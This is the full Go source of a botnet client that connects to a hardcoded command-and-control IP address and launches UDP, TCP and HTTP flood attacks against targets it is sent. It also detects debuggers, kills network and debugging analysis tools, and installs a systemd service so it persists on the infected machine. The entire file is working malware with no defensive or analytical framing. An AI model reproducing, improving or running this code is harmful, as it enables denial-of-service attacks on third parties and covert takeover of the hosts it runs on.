package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	serverAddr     = "144.172.94.160:7002"
	pingInterval   = 30 * time.Second
	reconnectDelay = 15 * time.Second
	maxRetries     = 5
	challengeSalt  = "anothersecretkeychangeme"
)

type Frame struct {
	Type    byte
	Payload []byte
}

type BotStats struct {
	StartTime    time.Time
	AttackCount  int
	SuccessCount int
	LastCommand  time.Time
}

var (
	stats            = make(map[string]*BotStats)
	statsLock        sync.Mutex
	activeConns      = make(map[net.Conn]bool)
	connLock         sync.Mutex
	processStartTime = time.Now()
	lastCommandTime  = time.Now()
	totalAttackCount = 0
)

func main() {
	logMessage("SYSTEM", "Starting bot client...")
	logMessage("SYSTEM", fmt.Sprintf("OS: %s, Arch: %s, CPUs: %d", runtime.GOOS, runtime.GOARCH, runtime.NumCPU()))

	if isDebugging() {
		logMessage("SECURITY", "Debugger detected! Exiting...")
		os.Exit(1)
	}

	killAnalysisTools()
	go persistenceMechanism()

	tlsConfig := setupTLS()
	if tlsConfig == nil {
		return
	}

	for {
		conn, err := connectWithRetry(tlsConfig)
		if err != nil {
			time.Sleep(reconnectDelay)
			continue
		}

		if err := handleSession(conn); err != nil {
			logMessage("ERROR", fmt.Sprintf("Session error: %v", err))
			cleanupConnection(conn)
			time.Sleep(reconnectDelay)
		}
	}
}

func setupTLS() *tls.Config {
	caCert, err := ioutil.ReadFile("certs/ca.crt")
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to read CA cert: %v", err))
		return nil
	}

	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		logMessage("ERROR", "Failed to parse CA cert")
		return nil
	}

	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to load client cert: %v", err))
		return nil
	}

	return &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}
}

func connectWithRetry(tlsConfig *tls.Config) (net.Conn, error) {
	var conn net.Conn
	var err error

	for i := 0; i < maxRetries; i++ {
		logMessage("NETWORK", fmt.Sprintf("Connection attempt %d/%d to %s", i+1, maxRetries, serverAddr))
		conn, err = tls.Dial("tcp", serverAddr, tlsConfig)
		if err == nil {
			return conn, nil
		}
		logMessage("ERROR", fmt.Sprintf("Connection failed: %v", err))
		time.Sleep(reconnectDelay)
	}

	return nil, errors.New("max retries exceeded")
}

func handleSession(conn net.Conn) error {
	logMessage("NETWORK", "Starting new session")
	defer logMessage("NETWORK", "Session ended")

	if err := registerBot(conn); err != nil {
		return fmt.Errorf("registration failed: %v", err)
	}

	connLock.Lock()
	activeConns[conn] = true
	connLock.Unlock()

	go pingHandler(conn)

	reader := bufio.NewReader(conn)
	for {
		frame, err := readFrame(reader)
		if err != nil {
			return fmt.Errorf("read error: %v", err)
		}

		switch frame.Type {
		case 0x01: // Command
			if err := handleCommandFrame(conn, frame.Payload); err != nil {
				return fmt.Errorf("command handling error: %v", err)
			}
		case 0x02: // Ping
			if err := sendFrame(conn, 0x02, []byte("PONG")); err != nil {
				return fmt.Errorf("ping response error: %v", err)
			}
		}
	}
}

func registerBot(conn net.Conn) error {
	challenge, err := readChallenge(conn)
	if err != nil {
		return fmt.Errorf("challenge read failed: %v", err)
	}

	response := generateChallengeResponse(challenge)
	if err := sendFrame(conn, 0x00, []byte(response)); err != nil {
		return fmt.Errorf("response send failed: %v", err)
	}

	stats := collectBotStats()
	return sendFrame(conn, 0x03, []byte(stats))
}

func readChallenge(conn net.Conn) (string, error) {
	frame, err := readFrame(bufio.NewReader(conn))
	if err != nil {
		return "", err
	}
	if frame.Type != 0x00 {
		return "", errors.New("invalid challenge frame type")
	}
	return string(frame.Payload), nil
}

func generateChallengeResponse(challenge string) string {
	h := hmac.New(sha256.New, []byte(challengeSalt))
	h.Write([]byte(challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func pingHandler(conn net.Conn) {
	ticker := time.NewTicker(pingInterval)
	defer ticker.Stop()

	for range ticker.C {
		connLock.Lock()
		if !activeConns[conn] {
			connLock.Unlock()
			return
		}
		connLock.Unlock()

		stats := collectBotStats()
		if err := sendFrame(conn, 0x03, []byte(stats)); err != nil {
			logMessage("ERROR", fmt.Sprintf("Ping failed: %v", err))
			return
		}
	}
}

func handleCommandFrame(_ net.Conn, payload []byte) error {
	command := string(payload)
	logMessage("COMMAND", fmt.Sprintf("Received command: %s", command))

	if strings.HasPrefix(command, "!") {
		parts := strings.Fields(command)
		if len(parts) < 4 {
			return errors.New("invalid command format")
		}

		method := parts[0]
		target := parts[1]
		port := parts[2]
		duration := parts[3]

		dur, err := strconv.Atoi(duration)
		if err != nil || dur <= 0 {
			return errors.New("invalid duration")
		}

		statsLock.Lock()
		if _, exists := stats[target]; !exists {
			stats[target] = &BotStats{StartTime: time.Now()}
		}
		stats[target].AttackCount++
		totalAttackCount++
		stats[target].LastCommand = time.Now()
		lastCommandTime = time.Now()
		statsLock.Unlock()

		go executeAttack(method, target, port, dur)

		statsLock.Lock()
		stats[target].SuccessCount++
		statsLock.Unlock()
	}

	return nil
}

func executeAttack(method, target, port string, duration int) {
	logMessage("ATTACK", fmt.Sprintf("Executing %s attack on %s:%s for %d seconds", method, target, port, duration))

	switch method {
	case "!udpflood":
		genericFlood("udp", target, port, duration, 1024)
	case "!tcpflood":
		genericFlood("tcp", target, port, duration, 0)
	case "!http":
		httpFlood(target, port, duration)
	default:
		logMessage("ERROR", fmt.Sprintf("Unknown attack method: %s", method))
	}
}

func genericFlood(network, target, port string, duration, pktSize int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	payload := make([]byte, pktSize)
	rand.Read(payload)

	for time.Now().Before(timeout) {
		conn, err := net.Dial(network, net.JoinHostPort(target, port))
		if err != nil {
			continue
		}
		if pktSize > 0 {
			conn.Write(payload)
		}
		conn.Close()
		time.Sleep(10 * time.Millisecond)
	}
}

func httpFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target)

	for time.Now().Before(timeout) {
		conn, err := net.Dial("tcp", net.JoinHostPort(target, port))
		if err != nil {
			continue
		}
		conn.Write([]byte(req))
		conn.Close()
		time.Sleep(10 * time.Millisecond)
	}
}

func readFrame(reader *bufio.Reader) (*Frame, error) {
	header := make([]byte, 5)
	if _, err := io.ReadFull(reader, header); err != nil {
		return nil, err
	}

	length := binary.BigEndian.Uint32(header[1:5])
	payload := make([]byte, length)
	if _, err := io.ReadFull(reader, payload); err != nil {
		return nil, err
	}

	return &Frame{
		Type:    header[0],
		Payload: payload,
	}, nil
}

func sendFrame(conn net.Conn, frameType byte, payload []byte) error {
	header := make([]byte, 5)
	header[0] = frameType
	binary.BigEndian.PutUint32(header[1:5], uint32(len(payload)))

	_, err := conn.Write(header)
	if err != nil {
		return err
	}

	_, err = conn.Write(payload)
	return err
}

func collectBotStats() string {
	statsLock.Lock()
	defer statsLock.Unlock()

	uptime := time.Since(processStartTime).Seconds()
	statsStr := fmt.Sprintf("%.2f|%.2f|%d",
		time.Since(lastCommandTime).Seconds(),
		float64(totalAttackCount)/uptime,
		runtime.NumCPU())

	return statsStr
}

func cleanupConnection(conn net.Conn) {
	connLock.Lock()
	delete(activeConns, conn)
	connLock.Unlock()
	conn.Close()
}

func isDebugging() bool {
	if _, err := os.Stat("/proc/self/status"); err != nil {
		return false
	}

	data, err := ioutil.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}

	return !strings.Contains(string(data), "TracerPid:\t0")
}

func killAnalysisTools() {
	tools := []string{"wireshark", "tcpdump", "strace", "ltrace", "gdb"}
	for _, tool := range tools {
		exec.Command("pkill", "-9", tool).Run()
	}
}

func persistenceMechanism() {
	service := `[Unit]
Description=Bot Service
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=` + os.Args[0] + `

[Install]
WantedBy=multi-user.target`

	ioutil.WriteFile("/etc/systemd/system/bot.service", []byte(service), 0644)
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "bot.service").Run()
	exec.Command("systemctl", "start", "bot.service").Run()
}

func logMessage(category, message string) {
	colors := map[string]string{
		"SYSTEM":   "36",
		"NETWORK":  "33",
		"ATTACK":   "31",
		"STATS":    "32",
		"ERROR":    "35",
		"SECURITY": "91",
		"COMMAND":  "34",
	}

	color := colors[category]
	if color == "" {
		color = "37"
	}

	fmt.Printf("\033[%sm[%s] [%s] %s\033[0m\n",
		color,
		time.Now().Format("2006-01-02 15:04:05"),
		category,
		message)
}
